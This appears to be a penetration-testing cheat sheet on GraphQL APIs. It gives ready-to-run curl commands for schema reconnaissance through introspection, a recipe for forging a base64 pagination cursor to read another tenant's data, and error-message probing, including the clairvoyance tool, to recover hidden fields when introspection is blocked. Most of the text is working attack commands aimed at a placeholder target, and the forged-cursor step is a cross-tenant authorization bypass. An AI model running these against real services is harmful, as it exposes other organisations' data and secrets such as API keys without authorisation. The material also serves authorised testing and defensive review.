# GraphQL

Introspection on (quickest schema recon):
```bash
curl -sk <TARGET>/graphql -H 'Content-Type: application/json' -d '{"query":"{ __schema { types { name fields { name } } } }"}'
```

Trusted client-controlled pagination cursor — if `after`/cursor values decode to JSON (often plain base64) and the resolver trusts a field inside it (e.g. tenant/org) instead of re-checking against the authenticated session, forge a cursor from another tenant to read across tenants:
```bash
echo -n '{"id":0,"org":"<other-tenant>"}' | base64
curl -sk <TARGET>/graphql -H 'Content-Type: application/json' \
  -d '{"query":"query($a:String){items(first:50,after:$a){edges{id}}}","variables":{"a":"<forged-cursor>"}}'
```
Pass forged values as GraphQL `variables` rather than inline in the query string — avoids shell-escaping headaches with the base64 padding.

Introspection blocked but schema still recoverable — verbose validation errors ("Cannot query field X on type Y", "Did you mean Z?") leak field names and types one probe at a time, enough to feed into an automated schema-recovery tool:
```bash
curl -sk <TARGET>/graphql -H 'Content-Type: application/json' -d '{"query":"{ nonexistentField }"}'   # error message often names the real return type
curl -sk <TARGET>/graphql -H 'Content-Type: application/json' -d '{"query":"{ knownField { __bogus } }"}'  # "Did you mean <realHiddenField>?" leaks hidden fields
clairvoyance <TARGET>/graphql -o schema.json    # automates the same error-oracle probing at scale
```
A field exposed on a type to every authenticated user (an API key, an internal note) is a common hiding spot once the schema is recovered — go back and just request it directly.
